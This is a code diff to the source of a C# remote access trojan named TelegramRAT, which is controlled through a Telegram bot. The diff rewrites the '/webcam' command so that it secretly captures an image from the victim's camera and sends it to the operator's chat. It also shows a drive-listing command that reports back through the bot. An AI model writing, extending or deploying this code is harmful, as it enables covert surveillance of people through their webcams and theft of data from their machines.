@@ -18,6 +18,9 @@ using NAudio.Wave;
 using IronPython.Hosting;
 using Microsoft.Scripting.Hosting;
 using Microsoft.Win32;
+using AForge;
+using AForge.Video;
+using AForge.Video.DirectShow;
 
 
 namespace TelegramRAT
@@ -25,7 +28,7 @@ namespace TelegramRAT
     public static class Program
     {
         static TelegramBotClient Bot;
-        
+
 
         readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
         readonly static string BotToken = null; // Place your Telegram bot token. 
@@ -39,8 +42,8 @@ namespace TelegramRAT
 
         static void Main(string[] args)
         {
-            
-            
+
+
             string thisprocessname = Process.GetCurrentProcess().ProcessName;
 
             if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
@@ -684,28 +687,43 @@ namespace TelegramRAT
                 Example = "/webcam",
                 Execute = async (model, update) =>
                 {
-                    await Task.Run(async () =>
+                    await Task.Run(() =>
                     {
-                        try
+                        Task.Run(() =>
                         {
-                            Mat img = new Mat();
-
-                            using (var FrameSrc = Cv2.CreateFrameSource_Camera(0))
+                            try
                             {
-                                FrameSrc.NextFrame(img);
+                                Bitmap endMap;
+                                MemoryStream webcamShotStream = new MemoryStream();
+
+                                FilterInfoCollection capdevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                                if (capdevices.Count == 0)
+                                {
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This machine has no webcamera.", replyToMessageId: update.Message.MessageId);
+                                }
+
+                                VideoCaptureDevice device = new VideoCaptureDevice(capdevices[0].MonikerString);
+                                device.NewFrame += (sender, args) =>
+                                {
+                                    endMap = args.Frame.Clone() as Bitmap;
+                                    endMap.Save(webcamShotStream, ImageFormat.Png);
+                                    (sender as VideoCaptureDevice).SignalToStop();
+                                };
+
+                                device.Start();
+                                device.WaitForStop();
+
+                                webcamShotStream.Position = 0;
+
+                                InputOnlineFile webcamPhoto = new InputOnlineFile(webcamShotStream);
+                                Bot.SendPhotoAsync(update.Message.Chat.Id, webcamPhoto);
+                                webcamShotStream.Close();
                             }
-                            MemoryStream webcamShot = img.ToMemoryStream();
-
-                            webcamShot.Position = 0;
-
-                            InputOnlineFile webcamPhoto = new InputOnlineFile(webcamShot);
-                            await Bot.SendPhotoAsync(update.Message.Chat.Id, webcamPhoto);
-
-                        }
-                        catch (Exception ex)
-                        {
-                            ReportError(update, ex);
-                        }
+                            catch (Exception ex)
+                            {
+                                ReportError(update, ex);
+                            }
+                        });
                     });
                 }
 
@@ -1732,7 +1750,7 @@ namespace TelegramRAT
                                 {
                                     drivesStr.AppendLine();
                                 }
-                            }                            
+                            }
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, string.Join(string.Empty, drivesStr.ToString().Take(4096).ToArray()), ParseMode.Html, replyToMessageId: update.Message.MessageId);
                         }
                         catch (Exception ex)
